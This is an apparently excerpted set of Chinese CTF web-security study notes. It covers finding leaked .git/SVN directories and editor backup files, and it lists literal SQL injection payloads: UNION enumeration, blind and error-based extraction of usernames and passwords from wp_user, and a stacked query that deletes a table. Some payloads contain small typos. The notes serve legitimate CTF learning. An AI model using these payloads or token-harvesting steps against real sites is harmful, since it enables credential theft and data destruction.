# 第1章 Web入门
## 1.1 举足轻重的信息收集
### 1.1.1 敏感目录泄露
#### 1.git泄露
##### （1）常规git泄露  
使用https://github.com/denny0223/scrabble工具获取源代码  
##### （2）git回滚  
使用git reset，或者git log -stat查看每个commmit修改了哪些文件再用git diff HEAD commit-id查看当前版本和想查看的commit之间的变化  
##### （3）git分支  
手工进行文件提取  
##### （4）git泄露的其他利用
如.git/config文件夹中可能包含access_token信息，从而可以访问这个用户的其他仓库
#### 2.SVN泄露
推荐工具：https://github.com/kost/dvcs-ripper和Seay-svn（Windows下的源代码备份漏洞利用工具）
#### 3.HG泄露
推荐工具：https://github.com/kost/dvcs-ripper
#### 4.总结经验
字典非常重要，此外还可在某些工具的基础上二次开发，推荐工具：https://github.com/maurosoria/dirsearch 。对于重定向类型的问题，如果访问.git返回403，则试着访问.git/config，如果有文件返回则说明存在git泄露，反之一般不存在。SVN泄露一般在entries中爬取源代码，如果entries为空则注意wc.db文件是否存在，然后通过其中的checksum在pristine文件夹中获取源代码
### 1.1.2 敏感备份文件
#### 1.gedit备份文件
在Linux中用gedit编辑器保存后会生成后缀为“～”的文件，其文件内容就是刚编辑的内容
#### 2.vim备份文件
用vim编辑文件意外退出后时，会在当前目录生成备份文件，格式为：“.文件名.swp”。恢复SWP备份文件的办法是现在当前目录创建一个同名文件，再使用“vim -r flag”命令，即可得到意外退出时编辑的内容
#### 3.常规文件
robots.txt:记录一些目录和CMS版本信息
readme.md:记录CMS版本信息，甚至Github地址
www.zip/rar/tar.gz:往往是网站的源码备份
/index.php~或/index.php.bak:网站备份文件
#### 4.总结经验
可编写实时监控脚本监控SWP等备份文件。vim第一次意外退出生成*.swp，第二次为*.swo，第三次为*.swn，等等，此外还有*.un.文件名.swp类型的备份文件。在实际环境中，网站的备份可能是网站域名的压缩包
### 1.1.3 Banner识别
#### 1.自行搜集指纹库
Github上或其他扫描器搜集CMS指纹库
#### 2.使用已有工具
利用Wappalyzer工具
#### 3.总结经验
可试着随意输入一些URL，通过404页面和302跳转页面发现信息
### 1.1.4 题目经验总结
1.针对Windows服务器，大概率是寻找CMS在其上的漏洞   
2.在不知道密码和无法重置的情况下，通过CMS网站本身的特性，结合目录遍历来实现最后的RCE
## 1.2 CTF中的SQL注入
### 1.2.1 SQL注入基础
#### 1.2.1.1 数字型注入和UNION注入
?id=-1 union select 1,group_concat(table_name) from information.schema.tables where table_schema=database()  
?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name='xxx'
#### 1.2.1.2 字符型注入和布尔盲注
?id=1' and (select mid((select concat(user,0x7e,pwd) from wp_user),1,1))='a'%23
?id=1' and (select mid((select concat(user,0x7e,pwd) from wp_user),2,1))='d'%23
#### 1.2.1.3 报错注入
updatexml在执行时第二个参数应该为合法XPATH路径，否则会在引发报错的同时将传入的参数输出：  
?id=1' or updatexml(1,concat(0x7e,(select pwd from wp_user)),1)%23  
当目标开启多语句执行的时候，可以采用多语句执行的方式修改数据库的任意结构和数据，称作堆叠注入：  
?id=1%27;delete%20%20from%20wp_files;%23
#### 1.2.1.4 总结
注入使用优先级：UNION注入>报错注入>布尔盲注>时间盲注
### 1.2.2 注入点
